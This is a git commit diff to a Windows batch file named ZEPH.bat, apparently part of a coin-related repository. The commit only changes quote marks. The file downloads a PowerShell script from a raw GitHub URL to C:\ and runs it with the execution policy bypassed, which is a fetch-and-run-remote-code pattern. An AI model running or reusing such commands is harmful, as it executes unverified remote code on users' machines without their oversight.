b87208dcdd184783e5c7b67b562a08bff7805ee0
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-01-05 18:57:53 +0700

    ZEPH.bat

--- ZEPH.bat
+++ ZEPH.bat
@@ -1,2 +1,2 @@
-powershell.exe Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/configure_system.ps1' -OutFile 'C:\configure_system.ps1'
+powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/configure_system.ps1" -OutFile "C:\configure_system.ps1"
 powershell.exe -ExecutionPolicy Bypass -File "C:\configure_system.ps1"
